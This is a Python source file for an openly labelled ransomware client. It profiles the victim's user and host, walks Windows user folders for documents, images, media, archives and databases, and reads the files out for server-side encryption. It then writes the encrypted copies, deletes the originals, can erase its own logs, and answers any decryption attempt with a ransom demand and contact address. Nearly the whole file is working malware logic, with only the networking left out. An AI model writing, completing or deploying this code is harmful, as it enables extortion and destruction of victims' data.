import os
import json
import time
from pathlib import Path

class RansomwareClient:
    """
    Client-side ransomware that prepares files for server-side encryption.
    NO encryption keys or decryption capabilities on client side.
    Pure business logic - no networking concerns.
    """
    
    def __init__(self, base_directory="ransomware_data"):
        self.base_directory = Path(base_directory)
        self.base_directory.mkdir(exist_ok=True)
        self.encrypted_files_log = self.base_directory / "encrypted_files.json"
        self.session_id = None
        
    def get_system_info(self):
        """Get basic system information for ransomware session."""
        try:
            import platform
            import getpass
            
            info = {
                "username": getpass.getuser(),
                "hostname": platform.node(),
                "os": platform.platform(),
                "timestamp": time.time(),
                "architecture": platform.architecture()[0]
            }
            return info
        except Exception as e:
            return {"error": str(e)}
    
    def scan_target_files(self, target_paths=None, file_extensions=None, max_files=None):
        """
        Scan for files to encrypt.
        
        Args:
            target_paths: List of paths to scan (default: common user directories)
            file_extensions: List of file extensions to target
            max_files: Maximum number of files to return (for safety)
        
        Returns:
            List of file paths found
        """
        if target_paths is None:
            # Default target directories
            user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
            target_paths = [
                os.path.join(user_profile, 'Documents'),
                os.path.join(user_profile, 'Desktop'),
                os.path.join(user_profile, 'Pictures'),
                os.path.join(user_profile, 'Videos'),
                os.path.join(user_profile, 'Music')
            ]
        
        if file_extensions is None:
            # Common file types for ransomware targets
            file_extensions = [
                '.txt', '.doc', '.docx', '.pdf', '.xlsx', '.xls', '.ppt', '.pptx',
                '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff',
                '.mp3', '.mp4', '.avi', '.mov', '.wav',
                '.zip', '.rar', '.7z',
                '.sql', '.db', '.sqlite'
            ]
        
        target_files = []
        
        for path in target_paths:
            if not os.path.exists(path):
                continue
                
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        _, ext = os.path.splitext(file.lower())
                        
                        if ext in file_extensions:
                            # Skip system files and hidden files
                            if not file.startswith('.') and not file.startswith('~'):
                                target_files.append(file_path)
                                
                                # Safety limit
                                if max_files and len(target_files) >= max_files:
                                    return target_files
                                
            except (PermissionError, OSError):
                continue
        
        return target_files
    
    def prepare_file_for_server_encryption(self, file_path):
        """
        Prepare a file to be sent to server for encryption.
        NO encryption keys are handled by the client.
        
        Args:
            file_path: Path to the file to prepare
        
        Returns:
            Tuple (success: bool, file_data: bytes, file_info: dict)
        """
        try:
            # Check file size for safety (max 10MB per file)
            file_size = os.path.getsize(file_path)
            if file_size > 10 * 1024 * 1024:  # 10MB limit
                return False, None, {"error": f"File too large: {file_size} bytes"}
            
            # Read original file
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            # Prepare file metadata
            file_info = {
                'original_path': file_path,
                'file_size': len(file_data),
                'filename': os.path.basename(file_path),
                'directory': os.path.dirname(file_path)
            }
            
            return True, file_data, file_info
            
        except Exception as e:
            return False, None, {"error": str(e)}
    
    def save_encrypted_file_from_server(self, original_path, encrypted_data):
        """
        Save encrypted data received from server and remove original file.
        
        Args:
            original_path: Path to the original file
            encrypted_data: Encrypted data received from server
        
        Returns:
            Tuple (success: bool, message: str, encrypted_path: str)
        """
        try:
            # Create encrypted filename
            encrypted_path = original_path + '.encrypted'
            
            # Write encrypted data from server
            with open(encrypted_path, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            
            # Remove original file
            os.remove(original_path)
            
            return True, f"File encrypted and saved successfully", encrypted_path
            
        except Exception as e:
            return False, f"Failed to save encrypted file: {str(e)}", None
    
    def prepare_files_batch_for_server(self, file_paths):
        """
        Prepare multiple files to be sent to server for encryption.
        NO encryption is performed client-side.
        
        Args:
            file_paths: List of file paths to prepare
        
        Returns:
            Dictionary with file preparation results
        """
        results = {
            'prepared_files': [],
            'failed': [],
            'total_files': len(file_paths),
            'session_id': self.session_id
        }
        
        for file_path in file_paths:
            success, file_data, file_info = self.prepare_file_for_server_encryption(file_path)
            
            if success:
                results['prepared_files'].append({
                    'file_path': file_path,
                    'file_data': file_data,
                    'file_info': file_info
                })
            else:
                results['failed'].append({
                    'file_path': file_path,
                    'error': file_info.get('error', 'Unknown error')
                })
        
        return results
    
    def process_server_encrypted_batch(self, encryption_results):
        """
        Process encrypted files received back from server.
        
        Args:
            encryption_results: List of encryption results from server
        
        Returns:
            Dictionary with processing results
        """
        results = {
            'successful': [],
            'failed': [],
            'total_files': len(encryption_results),
            'session_id': self.session_id
        }
        
        for result in encryption_results:
            if result.get('success'):
                original_path = result['original_path']
                encrypted_data = bytes.fromhex(result['encrypted_data'])
                
                success, message, encrypted_path = self.save_encrypted_file_from_server(
                    original_path, encrypted_data
                )
                
                if success:
                    results['successful'].append({
                        'original_path': original_path,
                        'encrypted_path': encrypted_path,
                        'message': message
                    })
                else:
                    results['failed'].append({
                        'file_path': original_path,
                        'error': message
                    })
            else:
                results['failed'].append({
                    'file_path': result.get('original_path', 'Unknown'),
                    'error': result.get('error', 'Server encryption failed')
                })
        
        # Log the encrypted files
        self._log_encrypted_files(results['successful'])
        
        return results
    
    def find_encrypted_files(self, search_paths=None):
        """
        Find .encrypted files in the system.
        
        Args:
            search_paths: Paths to search in (default: user directories)
        
        Returns:
            List of encrypted file paths
        """
        if search_paths is None:
            user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
            search_paths = [
                os.path.join(user_profile, 'Documents'),
                os.path.join(user_profile, 'Desktop'),
                os.path.join(user_profile, 'Pictures'),
                os.path.join(user_profile, 'Videos'),
                os.path.join(user_profile, 'Music')
            ]
        
        encrypted_files = []
        
        for path in search_paths:
            if not os.path.exists(path):
                continue
                
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.encrypted'):
                            encrypted_files.append(os.path.join(root, file))
            except (PermissionError, OSError):
                continue
        
        return encrypted_files
    
    def get_encrypted_files_list(self):
        """Get list of files that were encrypted in this session."""
        try:
            if self.encrypted_files_log.exists():
                with open(self.encrypted_files_log, 'r') as f:
                    return json.load(f)
            else:
                return []
        except Exception as e:
            return {"error": str(e)}
    
    def _log_encrypted_files(self, encrypted_files):
        """Log encrypted files to local storage."""
        try:
            log_data = []
            if self.encrypted_files_log.exists():
                with open(self.encrypted_files_log, 'r') as f:
                    log_data = json.load(f)
            
            # Add new encrypted files to log
            for file_info in encrypted_files:
                log_entry = {
                    'original_path': file_info['original_path'],
                    'encrypted_path': file_info['encrypted_path'],
                    'timestamp': time.time(),
                    'session_id': self.session_id
                }
                log_data.append(log_entry)
            
            # Save updated log
            with open(self.encrypted_files_log, 'w') as f:
                json.dump(log_data, f, indent=2)
                
        except Exception as e:
            pass  # Silent fail for logging
    
    def set_session_id(self, session_id):
        """Set the session ID for this ransomware instance."""
        self.session_id = session_id
    
    def cleanup_logs(self):
        """Clean up local log files."""
        try:
            if self.encrypted_files_log.exists():
                os.remove(self.encrypted_files_log)
            return True
        except Exception:
            return False
    
    # SECURITY: Block all decryption attempts
    def attempt_decrypt(self, *args, **kwargs):
        """
        Blocks any decryption attempts on the client side.
        Decryption can only be performed by the server controller.
        """
        return {
            'success': False,
            'message': 'DECRYPTION DENIED: Files can only be decrypted by paying the ransom.',
            'error': 'Client-side decryption is disabled for security reasons.',
            'contact': 'Contact ransomware@example.com with your session ID for decryption.',
            'session_id': self.session_id,
            'note': 'NO ENCRYPTION KEYS ARE STORED ON THIS MACHINE'
        }
    
    def decrypt_file_with_key(self, *args, **kwargs):
        """Redirect to attempt_decrypt to block decryption."""
        return self.attempt_decrypt()
    
    def decrypt_files_batch(self, *args, **kwargs):
        """Redirect to attempt_decrypt to block decryption."""
        return self.attempt_decrypt()
    
    def encrypt_file_with_key(self, *args, **kwargs):
        """
        Legacy method redirected to server-side encryption.
        Client no longer handles encryption keys directly.
        """
        return {
            'success': False,
            'message': 'ENCRYPTION METHOD CHANGED: Use server-side encryption via prepare_file_for_server_encryption()',
            'error': 'Direct client-side encryption with keys is disabled for security.',
            'session_id': self.session_id
        }


def create_ransomware_client(base_directory="ransomware_data"):
    """Factory function to create a RansomwareClient instance."""
    return RansomwareClient(base_directory)


# Example usage and testing
if __name__ == "__main__":
    # This section is for testing purposes only
    client = create_ransomware_client()
    
    print("Ransomware Client initialized")
    print("System Info:", client.get_system_info())
    
    # Test file scanning (without actually encrypting)
    target_files = client.scan_target_files(max_files=5)
    print(f"Found {len(target_files)} target files")
    
    # Test decryption blocking
    result = client.attempt_decrypt()
    print("Decryption attempt result:", result['message'])